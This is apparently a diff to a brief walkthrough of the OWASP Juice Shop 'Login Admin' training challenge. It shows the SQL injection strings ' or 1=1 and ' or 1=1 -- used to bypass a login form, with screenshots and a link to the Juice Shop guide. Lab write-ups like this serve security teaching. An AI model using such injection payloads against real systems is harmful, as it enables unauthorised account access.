@@ -1,10 +1,20 @@
 # Login Admin
 
+`https://pwning.owasp-juice.shop/companion-guide/latest/part1/running.html`
+
+Using a common SQLi query first:
+
 ```sql
-' or 1=1 --
+' or 1=1
 ```
 
 ![alt text](assets/loginadmin.png)
+
+We can use SQL comments to login.
+
+```sql
+' or 1=1 --
+```
 
 ![alt text](assets/loginadmin2.png)
 
